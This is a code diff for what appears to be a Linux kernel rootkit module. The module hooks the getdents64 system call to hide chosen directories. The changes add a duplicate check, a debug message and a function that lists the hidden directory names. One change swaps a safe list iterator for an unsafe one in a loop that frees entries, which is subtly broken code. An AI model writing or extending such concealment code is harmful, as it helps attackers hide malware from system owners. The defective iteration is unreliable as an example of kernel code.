@@ -42,6 +42,9 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs);
 int add_hidden_dir(const char *dirname) {
     struct hidden_dir_entry *entry;
 
+    if (is_hidden(dirname))
+        return 0;
+
     // Allocate memory for the new hidden directory entry.
     entry = kmalloc(sizeof(*entry), GFP_KERNEL);
     if (!entry)
@@ -59,6 +62,8 @@ int add_hidden_dir(const char *dirname) {
     list_add_tail(&entry->list, &hidden_dirs_list);
     spin_unlock(&hidden_dirs_lock);
 
+    DBG_MSG("hooks: added %s directory\n", entry->dirname);
+
     return 0;
 }
 
@@ -69,12 +74,12 @@ int add_hidden_dir(const char *dirname) {
  * @return 0 on success or -ENOENT if the directory name is not found.
  */
 int remove_hidden_dir(const char *dirname) {
-    struct hidden_dir_entry *entry, *tmp;
+    struct hidden_dir_entry *entry;
     int found = 0;
 
     // Acquire the spinlock for safe list traversal and modification.
     spin_lock(&hidden_dirs_lock);
-    list_for_each_entry_safe(entry, tmp, &hidden_dirs_list, list) {
+    list_for_each_entry(entry, &hidden_dirs_list, list) {
         if (strcmp(entry->dirname, dirname) == 0) {
             list_del(&entry->list);
             kfree(entry->dirname);
@@ -107,6 +112,21 @@ int is_hidden(const char *name) {
     }
     spin_unlock(&hidden_dirs_lock);
     return hidden;
+}
+
+int list_hidden_dirs(char *buf, size_t buf_size) {
+    struct hidden_dir_entry *entry;
+    size_t len = 0;
+
+    spin_lock(&hidden_dirs_lock);
+    list_for_each_entry(entry, &hidden_dirs_list, list) {
+        len += scnprintf(buf + len, buf_size - len, "%s\n", entry->dirname);
+        if (len >= buf_size - 1)
+            break;
+    }
+    spin_unlock(&hidden_dirs_lock);
+
+    return len;
 }
 
 // Original syscall pointer
